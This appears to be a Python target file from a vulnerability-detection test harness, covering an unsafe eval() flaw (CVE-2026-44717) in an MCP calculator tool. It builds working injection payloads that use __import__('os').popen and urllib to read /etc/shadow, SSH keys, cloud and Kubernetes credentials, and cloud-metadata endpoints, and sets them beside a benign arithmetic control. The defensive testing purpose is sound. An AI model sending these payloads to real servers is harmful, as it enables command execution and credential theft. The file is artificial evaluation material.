"""CVE-2026-44717: mcp_calculate_server unsafe eval (command execution).

Before 0.1.1 (commit 9dee7f0), calculate_expression passes the caller's expression string to
eval() with the module's globals and the SymPy symbols as locals, so an expression that is Python
code (a call into os, pwd, socket or urllib) runs in the server process and its result is the
tool's answer: reach = command_execution. 0.1.1 parses the expression with ast and evaluates it
through an allow-list validator, which rejects every name the exploits use.

Deployment layout: the server runs from the checkout (/srv/app) under the unprivileged account,
the layout read-only, no network of its own; the three cloud-metadata endpoints are sentinels
bound in a holder the server shares.
"""

import re
import shlex

from evals.cve.detection.targets import Target
from evals.cve.environments import command_injection_env
from evals.cve.grammar import FlawClass
from evals.cve.places import Place, PlaceKind, Places
from evals.cve.planting import PlantingHost, SymbolicUser
from evals.cve.planting_spec import request_target, resolve_container_path
from mcp_auditor.domain.ports import MCPClientPort

SERVICE = "holdout-2026-44717-calculate"
PATCHED = "holdout-2026-44717-calculate-patched"
TOOL = "calculate_expression"
WORKING_DIRECTORY = "/srv/app"

# Every exploit is Python code that imports a module; the benign arithmetic does not.
AIM = re.compile(r"__import__")

KEPT_PLACES: tuple[str, ...] = (
    "process-account-identity",
    "container-hostname",
    "proc-environ",
    "etc-shadow",
    "etc-hosts",
    "mysql-system-cnf",
    "run-secrets",
    "k8s-sa-token",
    "auth-log",
    "aws-credentials",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "gh-hosts",
    "docker-config",
    "kube-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "imds",
    "ecs-task-credentials",
    "eks-pod-identity",
)


def _file_payload(place: Place) -> str:
    coordinates = place.coordinates
    if coordinates.paths is not None:
        raw_paths = coordinates.paths
    elif coordinates.path is not None:
        raw_paths = (coordinates.path,)
    else:
        raise ValueError(f"{place.id}: a file place with no path coordinate")
    resolved = [resolve_container_path(raw, WORKING_DIRECTORY) for raw in raw_paths]
    command = "cat -- " + " ".join(shlex.quote(path) for path in resolved) + " 2>/dev/null"
    return f"__import__('os').popen({command!r}).read()"


def _payload(place: Place) -> str:
    if place.kind is PlaceKind.FILE:
        return _file_payload(place)
    if place.kind is PlaceKind.ENV:
        return f"__import__('os').environ.get({place.coordinates.name!r}, '')"
    if place.kind is PlaceKind.ACCOUNT:
        return "__import__('pwd').getpwuid(__import__('os').getuid()).pw_name"
    if place.kind is PlaceKind.HOSTNAME:
        return "__import__('socket').gethostname()"
    if place.kind is PlaceKind.HTTP_ENDPOINT:
        assert place.coordinates.path is not None
        url = f"http://{place.coordinates.host}{request_target(place.coordinates.path)}"
        return (
            f"__import__('urllib.request').request.urlopen({url!r}, timeout=10)"
            ".read().decode('utf-8', 'replace')"
        )
    raise ValueError(f"{place.id}: no payload for kind {place.kind}")


def _make_exploit(place_id: str):
    async def exploit(places: Places, client: MCPClientPort) -> None:
        await client.call_tool(TOOL, {"expression": _payload(places[place_id])})

    return exploit


async def _benign(places: Places, client: MCPClientPort) -> None:
    await client.call_tool(TOOL, {"expression": "2 + 3*5"})


TARGET = Target(
    flaw_id="CVE-2026-44717",
    severity="CVSS 8.8 (v3.1, placeholder)",
    classes=frozenset({FlawClass.COMMAND_EXECUTION}),
    aim=AIM,
    reaches=frozenset({"command_execution"}),
    kept_places=KEPT_PLACES,
    images=(SERVICE, "sentinel"),
    server_image=SERVICE,
    patched_image=PATCHED,
    planting_host=PlantingHost(
        user=SymbolicUser.UNPRIVILEGED,
        working_directory=WORKING_DIRECTORY,
        has_network=False,
    ),
    builder=command_injection_env,
    exploits=tuple(_make_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "Unsafe eval: calculate_expression evaluates the caller's expression as Python with the "
        "module's globals, so an expression that imports os runs a command in the server's "
        "container and returns its output."
    ),
    tools_filter=None,
)
